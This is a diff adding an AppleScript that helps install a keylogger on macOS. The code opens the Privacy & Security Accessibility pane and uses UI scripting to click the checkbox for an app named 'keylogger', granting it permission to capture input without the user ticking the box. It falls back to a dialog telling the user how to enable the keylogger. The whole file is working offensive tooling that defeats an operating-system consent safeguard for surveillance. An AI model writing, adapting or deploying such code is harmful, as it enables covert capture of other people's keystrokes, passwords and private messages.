@@ -1,0 +1,45 @@
+(*
+Created by William Munnich
+Apple Script to edit user settings inside of "Allow the applications below to control your computer" to allow 
+the script to control your computer. If Script Editor not allowed asssistive access, then the 
+script will open settings and show user how to make keylogger work.
+*)
+
+-- Function to check if assistive access is enabled for this script
+on hasAssistiveAccess()
+	tell application "System Events"
+		set assistiveAccess to UI elements enabled
+	end tell
+	return assistiveAccess
+end hasAssistiveAccess
+-- Check and display a message based on the assistive access state
+set assistiveEnabled to hasAssistiveAccess()
+tell application "System Events"
+	tell application "System Settings"
+		activate
+		reveal anchor "Privacy_Accessibility" of pane id "com.apple.settings.PrivacySecurity.extension" -- Change the pane ID as needed
+		delay 1.0
+	end tell
+	
+	if assistiveEnabled then
+		-- Check the "keylogger" checkbox if it is unchecked
+		tell window "Accessibility" of process "System Settings"
+			-- Change to the name of you compiled keylogger
+			set keyloggerCheckbox to checkbox "keylogger" of UI element 1 of row 2 of table 1 of scroll area 1 of group 1 of scroll area 1 of group 1 of group 2 of splitter group 1 of group 1
+			if not (value of keyloggerCheckbox as boolean) then
+				click keyloggerCheckbox
+				display dialog "Please Grant Authorization"
+			else
+				display dialog "Authorization Already Granted"
+				-- Quit System Preferences if it's open
+				tell application "System Settings"
+					delay 1.0
+					if running then quit
+				end tell
+			end if
+		end tell
+	else
+		display dialog "Assistive access is not enabled for this script. Please enable it in System Preferences > Security & Privacy > Privacy > Accessibility. Then check Script Editor. or simply enable your keylogger(by name) in the same location."
+	end if
+end tell
+
